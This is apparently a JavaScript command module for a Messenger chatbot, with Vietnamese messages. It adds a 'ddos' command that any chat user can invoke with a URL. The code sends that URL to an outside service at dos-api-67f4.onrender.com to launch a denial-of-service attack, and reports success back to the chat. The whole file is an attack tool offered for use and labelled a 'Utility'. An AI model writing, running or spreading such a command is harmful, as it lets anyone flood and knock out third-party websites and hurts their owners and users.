const axios = require('axios');

module.exports.config = {
  name: "ddos",
  version: "1.0.0",
  hasPermssion: 0,
  credits: "goat => mirai",
  description: "Initiates a DDOS attack on the provided URL.",
  commandCategory: "Utility",
  usages: "[URL]",
  cooldowns: 5
};

module.exports.run = async function({ api, event, args }) {
  const url = args.join(' ');

  if (!url) {
    api.sendMessage("Vui lòng nhập URL để DDOS.\n\nVD: http://example.com", event.threadID, event.messageID);
    return;
  }

  api.sendMessage(`Bắt đầu DDOS trang web ${url}...`, event.threadID, event.messageID);

  await new Promise(resolve => setTimeout(resolve, 5000));

  try {
    const { data } = await axios.get(`https://dos-api-67f4.onrender.com/ddos?url=${encodeURIComponent(url)}`);
    console.log(data);

    const response = data.message || 'DDOS trang web thành công.';
    api.sendMessage(`\n\n${response}`, event.threadID, event.messageID);
  } catch (error) {
    api.sendMessage('Lỗi không thể request, vui lòng thử lại sau.', event.threadID, event.messageID);
    console.error(error);
  }
};
